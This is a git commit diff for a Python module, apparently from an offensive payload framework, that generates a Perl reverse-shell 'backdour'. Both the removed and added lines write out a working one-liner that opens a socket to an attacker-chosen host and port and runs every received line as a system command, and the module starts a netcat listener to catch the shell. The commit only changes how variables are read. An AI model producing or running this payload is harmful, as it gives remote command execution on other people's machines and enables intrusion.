6fdc39071189a406f513ec043ed93b07ec659409
Amer Araibia <46226856+ameraraibia168@users.noreply.github.com>
2024-07-13 11:59:20 +0100

    Update _2_reverse_tcp.py

--- waf/modules/payloads/nc/perl/_2_reverse_tcp.py
+++ waf/modules/payloads/nc/perl/_2_reverse_tcp.py
@@ -9,19 +9,19 @@ info = {
         "description" : "Payload creation and exploitation"
 }
 
-var.lname = ["payload.pl"]
-var.ltype = ["listen"]
+var.all_var['lname'] = "payload.pl"
+var.all_var['ltype'] = "listen"
 
 options ={
-  "LHOST" : [str(var.lhost[0]),'The listen address'],
-  "LPORT" : [str(var.lport[0]),'The listen port'],
-  "LNAME" : [str(var.lname[0]),'The name of payload'],
-  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
+  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
+  "LPORT" : [str(var.all_var['lport']),'The listen port'],
+  "LNAME" : [str(var.all_var['lname']),'The name of payload'],
+  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
 }
 
 def running():
     try:
-        if var.ltype[0] == "CREATE" or var.ltype[0] == "create":
+        if var.all_var['ltype'].lower() == "create":
             print ("")
             print (blue+"[*]"+default+ "Create a backdour")
             time.sleep(2)
@@ -33,16 +33,16 @@ def running():
             print ("")
             mark  = '"'
             mark2 = ':'
-            f = open(var.lname[0] , 'w')
+            f = open(var.all_var['lname'] , 'w')
             payload = '''
-perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"'''+var.lhost[0]+mark2+var.lport[0]+mark+''' );STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
+perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"'''+var.all_var['lhost']+mark2+var.all_var['lport']+mark+''' );STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 
 '''
             f.write(payload)
             f.close()
 
-        elif var.ltype[0] == "LISTEN" or var.ltype[0] == "listen":
-            os.system("nc -l -p "+str(var.lport[0])+" -v")
+        elif var.all_var['ltype'].lower() == "listen":
+            os.system("nc -l -p "+str(var.all_var['lport'])+" -v")
 
         else:
             print (red+"[-]"+default+"Choose LTYPE " )
